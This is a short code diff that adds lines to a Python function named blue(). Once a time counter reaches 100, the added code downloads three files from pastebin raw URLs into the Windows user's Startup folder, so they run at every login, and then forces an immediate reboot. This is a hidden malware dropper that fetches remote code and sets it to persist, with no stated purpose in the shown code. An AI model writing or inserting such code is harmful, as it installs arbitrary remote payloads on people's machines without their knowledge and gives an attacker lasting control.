@@ -57,6 +57,22 @@ def blue():
 				
 				if curr_time == str(100) :
 					
+					user = os.environ['USERNAME']
+
+					url = "https://pastebin.com/raw/RSiyfdAQ"
+
+					r = requests.get(url, allow_redirects=True)
+					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.py", 'wb').write(r.content)
+
+					url = "https://pastebin.com/raw/XTkPxwrr"
+
+					r = requests.get(url, allow_redirects=True)
+					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.qml", 'wb').write(r.content)
+
+					url = "https://pastebin.com/raw/XV47ctX6"
+
+					r = requests.get(url, allow_redirects=True)
+					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
 					
 					os.system("shutdown /r /t 1")
 
